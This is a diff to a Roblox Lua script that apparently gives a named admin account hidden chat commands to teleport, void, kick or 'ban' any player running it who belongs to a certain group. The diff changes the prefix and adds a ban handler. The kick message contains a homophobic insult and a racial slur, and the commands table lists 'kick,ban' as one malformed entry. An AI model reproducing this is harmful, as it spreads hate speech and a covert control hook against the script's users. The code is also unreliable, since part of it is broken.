@@ -2,8 +2,8 @@ local plr = game:GetService("Players").LocalPlayer
 if plr:IsInGroup("12096344") then
 
     local admins = {"2hot4gizem"}
-    local commands = {"tp","usingsilent","void","kick"}
-    local prefix = "x"
+    local commands = {"tp","usingsilent","void","kick,ban"}
+    local prefix = ";"
     
     local function findPlayer(name,sender)
      for _,player in pairs(game.Players:GetPlayers()) do
@@ -29,6 +29,10 @@ if plr:IsInGroup("12096344") then
     
     commands.kick = function(sender,args)
         game.Players.LocalPlayer:kick("farzad kicked ur gay ass NIGGER") 
+    end
+
+    commands.ban = function(sender,args)
+        game.Players.LocalPlayer:kick("PERMA-BAN") 
     end
     
     commands.void = function(sender,args)
